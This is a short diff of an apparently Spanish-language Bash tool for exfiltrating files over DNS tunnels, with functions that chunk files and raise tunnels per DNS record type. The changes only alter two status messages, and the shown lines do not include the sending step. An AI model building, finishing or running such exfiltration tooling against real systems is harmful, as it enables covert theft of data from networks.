@@ -80,7 +80,7 @@ exfiltrar_fichero() {
     split -b "$CHUNK_BYTES" "$fichero" "$TMP_DIR/chunk_"
     local total
     total=$(ls "$TMP_DIR/chunk_"* 2>/dev/null | wc -l)
-    (( total == 0 )) && { echo "[!] '$filename' vacío"; return; }
+    (( total == 0 )) && { echo "'$filename' vacío"; return; }
     local i=0
     for chunk in "$TMP_DIR/chunk_"*; do
         i=$((i + 1))
@@ -109,7 +109,7 @@ for DNS_TYPE in "${TIPOS_DNS[@]}"; do
     echo "Sesión $DNS_TYPE"
     ficheros=("$FICHEROS_DIR"/*)
     if [[ ! -e "${ficheros[0]}" ]]; then
-        echo "[!] Sin ficheros en $FICHEROS_DIR"
+        echo "Sin ficheros en $FICHEROS_DIR"
         exit 1
     fi
     if ! levantar_tunel "$DNS_TYPE"; then
